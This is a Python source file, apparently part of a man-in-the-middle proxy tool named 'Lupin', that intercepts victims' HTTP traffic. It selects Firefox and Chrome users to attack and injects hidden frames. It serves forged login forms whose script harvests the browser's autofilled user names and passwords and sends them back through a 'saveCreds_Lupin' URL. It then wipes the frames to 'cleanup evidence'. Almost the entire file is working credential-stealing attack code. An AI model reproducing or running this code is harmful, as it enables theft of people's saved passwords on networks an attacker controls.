
import urlparse, os, sys, random, time

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory
from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from PersistentData import PersistentData

class ClientRequest(Request):

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       	 = reactor
        self.PersistentData      = PersistentData.getInstance()
		
    def lupinRequest(self,host):
	return defer.succeed(host)


    def resolveHost(self, host):
        if host in self.PersistentData.dnsCache:
            return defer.succeed(self.PersistentData.dnsCache[host])
        else:
            return reactor.resolve(host)
 

    def resolvedError(self, error):
	try:
		self.finish()
	except:
		print self.getHeader('host')+ self.getPathFromUri()+" error3", sys.exc_info()[0]


    def process(self):
	
        host     = self.getHeader('host') 
        path     = self.getPathFromUri()       	

	if "_Lupin" in path:
		deferred = self.lupinRequest(host)
		deferred.addCallback(self.processLupinRequest)
	else:
        	deferred = self.resolveHost(host)
       		deferred.addCallback(self.resolved)
        	deferred.addErrback(self.resolvedError)
	
        

    def processLupinRequest(self, host):
	path     = self.getPathFromUri()       	
	url      = 'http://' + host + path
	
	if "sendMasterFrame_Lupin" in path:
            self.sendMasterFrame()
            return	

	if "sendForgery_Lupin" in url:     
           self.sendForgery(host) 
           return

	if "saveCreds_Lupin" in path:
           self.saveCreds()	
 	   self.sendMove()
           return

	if "sendOK_Lupin" in path:
            self.sendOK(host)
	    return

	if "sendCleanUp_Lupin" in path:
            self.sendCleanUp()
            #self.PersistentData.addVictim(self.getClientIP())
            return	


    def resolved(self, address):
        host              = self.getHeader("host")
        path              = self.getPathFromUri()      
        headers           = self.stripHeader()
        actAs 		  = "evilProxy"
        self.content.seek(0,0)
        postData          = self.content.read()

        self.PersistentData.addDnsCache(host, address)
	
	if "google-analytics" in host or "favicon.ico" in path:
	   self.send404()
	   return

        if self.doNotAttack(host,path):
	   actAs = "goodProxy"  
           #print "proxying "+host+path
        
	self.proxy(address, self.method, path, postData, actAs, headers)           



    # returns True when the client request should be proxied cleanly
    def doNotAttack(self,host,path):
       
 
        client            = self.getClientIP()
        agent             = self.getHeader("user-agent").upper()

	# only works on Firefox/Chrome
        if "CHROME/" not in agent and "FIREFOX/" not in agent:
            return True

        if self.PersistentData.shutDown:
		return True
  
        if self.PersistentData.oldVictim(client):
		print "old news"
		return True

	# only attach to "GET" requests	
	if self.method != "GET":
		return True

	lastAttack = 0
	if client in self.PersistentData.lastAttackTime:
        	lastAttack = self.PersistentData.lastAttackTime[client]

	if time.time() - lastAttack < 10:
		#print "idling..."
		return True

        if len(path) > 50:
		return True
	
	if "google" in host and "/complete/search?" in path:
		return True;

	if '.' in path and ".html" not in path and ".php" not in path:
		return True
	
	return False



    def proxy(self, host, method, path, postData,actAs,headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
   	connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)


    def stripHeader(self):
        headers = self.getAllHeaders().copy()        
        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        return headers


    def getPathFromUri(self):
        if self.uri.startswith("http://"):
            index = self.uri.find('/', 7)
            return self.uri[index:]
        return self.uri        
      

   
    # received stolen credentials ... save them
    def saveCreds(self):
        path 	= self.getPathFromUri()
        k 	= path.find('saveCreds_Lupin=')
        print "STOLE: "+path[k+16:]
	#stolenCredentials = open("stolenCredentials.txt",'a');
	#stolenCredentials.write(path[k+16:]+'\n')
	#stolenCredentials.close()



    # send a 'dummy' OK response. (So that client browser does not hang on a request)
    def sendOK(self,host):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        self.write("<html><head></head><body>"+host+"</body></html>")    
        self.finish() 


    def sendMove(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        self.write("<html><head></head><body>Moving ... <script type='text/javascript'>window.parent.postMessage(window.name, '*');</script></body></html>")  
        self.finish() 


    def send404(self):
        self.setResponseCode(404, "Not Found")
        self.setHeader("Connection", "close")  
        self.finish() 


        
    # attack over, send signal to cleanup evidence.. (destroys all frames...)
    def sendCleanUp(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close") 
        self.write("<html><head> \
			<script type='text/javascript'> \
				window.parent.postMessage('destroyMasterFrame','*'); \
			</script> \
		    </head><body></body></html>")  
  
        self.finish()   
	print "DONE!!!" 



    # client requested a target, respond with a forged login form, and script to steal credentials.
    def sendForgery(self,host):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
	action = self.PersistentData.loginAction[host]
	data = "<html><head></head><body> \
			<form method='POST' action="+action+"> \
				<input type='text' name='user'/> \
				<input type='password' name='pass'/> \
			</form> \
			<script type='text/javascript'> \
			function steal(){ \
    				user=document.getElementsByName('user')[0].value; \
    				pass=document.getElementsByName('pass')[0].value; \
    				host=location.hostname; \
    				if(pass.length > 0){ \
					src = 'http://'+host+'?saveCreds_Lupin='+host+'|'+user+'|'+pass;\
					document.location.replace(src);\
				}else{ \
					window.parent.postMessage(window.name, '*'); \
				} \
			} \
			setTimeout('steal()',100); \
			</script> \
		</body></html>"
    
        self.write(data)
        self.finish()
     

    '''
    send all data needed for frames to operate. 
    This includes the list of targets + scripts to cycle through them
    '''
    def sendMasterFrame(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "keep-alive")
        slaveFrame = open("Lupin/slaveFrame.js",'r+')
	

        masterFrame =  "<html><head><script type='text/javascript'>"+self.PersistentData.slaveVariables+slaveFrame.read()+"</script></head><body onload='init();'></body></html>"

        slaveFrame.close()
        self.write(masterFrame)
        self.finish()
